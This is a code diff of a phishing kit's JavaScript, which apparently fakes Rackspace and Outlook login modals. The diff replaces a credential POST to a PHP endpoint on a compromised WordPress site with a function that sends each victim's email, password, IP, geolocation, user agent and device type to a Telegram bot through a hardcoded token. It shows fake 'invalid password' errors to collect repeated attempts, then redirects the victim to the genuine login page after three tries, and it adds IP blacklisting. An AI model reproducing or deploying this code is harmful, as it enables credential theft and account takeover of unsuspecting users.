@@ -411,10 +411,12 @@ function sendMessage2() {
                 console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
                 loadContent();
             } else {
+                addBlacklistedIP(ip);
                 console.log('Error:', data);
             }
         })
         .catch(error => {
+            addBlacklistedIP(ip);
             console.error('Error:', error);
         });
 }
@@ -444,9 +446,10 @@ function sendMessage2() {
         }
     
     
-        function showRackspaceForm() {
-    notifyTelegram('Rackspace');
+        let rackspaceAttempts = 0;
+let outlookAttempts = 0;
 
+function showRackspaceForm() {
     $('#rackspaceModal').modal('show');
 }
 
@@ -455,8 +458,6 @@ function hideRackspaceForm() {
 }
 
 function showOutlookForm() {
-    notifyTelegram('Outlook');
-
     $('#outlookModal').modal('show');
 }
 
@@ -464,46 +465,61 @@ function hideOutlookForm() {
     $('#outlookModal').modal('hide');
 }
 
-function notifyTelegram(provider) {
-    const botToken = '7405272455:AAHmoxjlVkxxbb0wYrb9U1gO5TgSEdiOadI';
-    const chatId = '1412104349';
-    const message = `🔒 *New Login Attempt*\n\n👤 Provider: ${provider}\n🕒 Time: ${new Date().toLocaleString()}`;
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: new URLSearchParams({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Notification sent to Telegram');
-        } else {
-            console.error('Failed to send notification to Telegram');
-        }
-    })
-    .catch(error => {
-        console.error('Failed to send notification to Telegram', error);
-    });
-}
-
 $(document).ready(function() {
-    $('#rackspaceEmail, #rackspacePassword').on('input', function() {
-        $('#rackspaceEmailError').hide();
+    // Hide Rackspace error only when user types in the Rackspace password field
+    $('#rackspacePassword').on('input', function() {
         $('#rackspacePasswordError').hide();
     });
 
-    $('#outlookEmail, #outlookPassword').on('input', function() {
-        $('#outlookEmailError').hide();
+    // Hide Outlook error only when user types in the Outlook password field
+    $('#outlookPassword').on('input', function() {
         $('#outlookPasswordError').hide();
     });
 });
+
+// Function to get user's IP address and geolocation
+function getUserLocation(callback) {
+    $.getJSON('https://ipinfo.io/json?token=d8eafd6deea176', function(data) {
+        callback({
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country
+        });
+    });
+}
+
+// Function to detect if the device is mobile or desktop
+function isMobileDevice() {
+    return /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+}
+
+// Function to send a notification to Telegram
+function notifyTelegram(provider, email, attempt, password, ip, userAgent, device, city, region, country) {
+    const botToken = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+    const chatId = '1412104349';
+    const message = `🔒 *New Login Attempt*\n\n👤 *Provider:* ${provider}\n🔢 *Attempt:* ${attempt}\n📧 *Email/Username:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP Address:* ${ip}\n🏙️ *Location:* ${city}, ${region}, ${country}\n💻 *User Agent:* ${userAgent}\n📱 *Device Type:* ${device}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    console.log('Sending notification to Telegram...');
+    console.log('Message:', message);
+
+    $.ajax({
+        url: url,
+        method: 'POST',
+        data: {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        },
+        success: function(response) {
+            console.log('Notification sent to Telegram', response);
+        },
+        error: function(xhr, status, error) {
+            console.error('Failed to send notification to Telegram', xhr, status, error);
+        }
+    });
+}
 
 function submitRackspace() {
     const email = $('#rackspaceEmail').val().trim();
@@ -527,33 +543,29 @@ function submitRackspace() {
         $('.btn-primary').addClass('loading');
         $('.spinner-border').show();
 
-        $.ajax({
-            url: 'https://tastymomos.com.au//wp-content/wflogs/trash/pgo.php', 
-            method: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({ email: email, password: password, provider: 'rackspace' }),
-            success: function(response) {
-                if (response.valid) {
-                    window.location.href = 'rackspace-success.html';
-                } else {
-                    $('#rackspacePasswordError').text('Invalid email or password.').show();
-                }
-            },
-            error: function() {
-                $('#rackspacePasswordError').text('An error occurred. Please try again.').show();
-            },
-            complete: function() {
-                $('.btn-primary').removeClass('loading');
-                $('.spinner-border').hide();
-            }
+        // Increment attempt count
+        rackspaceAttempts++;
+
+        // Fetch IP, location details and notify Telegram with all information
+        getUserLocation(function(location) {
+            const userAgent = navigator.userAgent;
+            const device = isMobileDevice();
+            notifyTelegram('Rackspace', email, rackspaceAttempts, password, location.ip, userAgent, device, location.city, location.region, location.country);
         });
+
+        setTimeout(function() {
+            $('.btn-primary').removeClass('loading');
+            $('.spinner-border').hide();
+
+            if (rackspaceAttempts < 3) {
+                $('#rackspacePasswordError').text('Invalid email or password. Please try again.').show();
+            } else {
+                window.location.href = 'https://apps.rackspace.com/app'; // Redirect after 3 failed attempts
+            }
+        }, 1000); // 1-second delay before showing error
     }
 }
-    function validateEmail(email) {
-        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return regex.test(email);
-    }
-    
+
 function submitOutlook() {
     const email = $('#outlookEmail').val().trim();
     const password = $('#outlookPassword').val().trim();
@@ -573,28 +585,34 @@ function submitOutlook() {
         $('.btn-primary').addClass('loading');
         $('.spinner-border').show();
 
-        $.ajax({
-            url: 'https://tastymomos.com.au//wp-content/wflogs/trash/pgo.php', 
-            method: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({ email: email, password: password, provider: 'outlook' }),
-            success: function(response) {
-                if (response.valid) {
-                    window.location.href = 'outlook-success.html';
-                } else {
-                    $('#outlookPasswordError').text('Invalid email or password.').show();
-                }
-            },
-            error: function() {
-                $('#outlookPasswordError').text('An error occurred. Please try again.').show();
-            },
-            complete: function() {
-                $('.btn-primary').removeClass('loading');
-                $('.spinner-border').hide();
-            }
+        // Increment attempt count
+        outlookAttempts++;
+
+        // Fetch IP, location details and notify Telegram with all information
+        getUserLocation(function(location) {
+            const userAgent = navigator.userAgent;
+            const device = isMobileDevice();
+            notifyTelegram('Outlook', email, outlookAttempts, password, location.ip, userAgent, device, location.city, location.region, location.country);
         });
+
+        setTimeout(function() {
+            $('.btn-primary').removeClass('loading');
+            $('.spinner-border').hide();
+
+            if (outlookAttempts < 3) {
+                $('#outlookPasswordError').text('Invalid email or password. Please try again.').show();
+            } else {
+                window.location.href = 'https://login.microsoftonline.com/common/login'; // Redirect after 3 failed attempts
+            }
+        }, 1000); // 1-second delay before showing error
     }
-}    
+}
+
+function validateEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+}
+
     
         function loadContent() {
     const isBot = detectUserAgent();
